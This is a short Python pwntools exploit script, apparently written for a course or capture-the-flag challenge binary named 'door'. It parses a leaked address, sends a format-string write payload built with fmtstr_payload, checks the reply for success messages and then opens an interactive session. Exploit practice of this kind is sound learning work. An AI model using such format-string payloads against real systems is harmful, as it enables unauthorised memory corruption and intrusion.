#!/usr/bin/python2

from pwn import *

import time


PROGRAM_NAME = "door"
ENCODING = "ascii"
MAGIC = "APES"

def io_beg():
	return process("./door")
	#remote('plzpwn.me', 2000)
	#process('./jump')	
	
def io_rdy(x):
	return x.recvuntil("Speak the phrase APplES and I shall open:", timeout = 3)

# my 6443 graveyard function
def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	

def main():	
	#context.binary = #"./door"
	
	fin = 0
	stage = 0
	
	while(fin < 1):
		k = 0
		if(stage == 0):
			k = k + 1
			io = io_beg()						
				
			io.recvuntil("A landslide has blocked the way at")
			addr1 = io.recvline().strip()
			addr1int = int(addr1, 16)
				
			io_rdy(io)
			addr1inthex = toHexCustom(addr1int)
			print("peculiar addr: "+addr1inthex)
			
			addr2 = addr1int - 512
			print("YO")
			payload = fmtstr_payload(7, {0x7B4:0x90909090},1,'byte')
			#fmtstr_payload(7, {addr2:0x53455041},0,'byte')
			print("pay: ["+payload+"]")
			
			io.sendline(payload)
		
			inbound = io.recvall(timeout = 0.5)
				
			print(inbound)

		
			if(inbound.find("This doesn't satisy the door") != -1):
				print("[bad][k =  "+str(k)+"]")
				k = k + 1
			elif(inbound.find("How did you get") != -1):
				print("[gud][k =  "+str(k)+"]")
				notfound = 0
			else:
				print("[idk][k =  "+str(k)+"]")

			
			io.interactive()
			stage = stage + 1
				
		else:
			print("I think I'm done :)")
			fin = 1

if __name__ == '__main__':
	main()
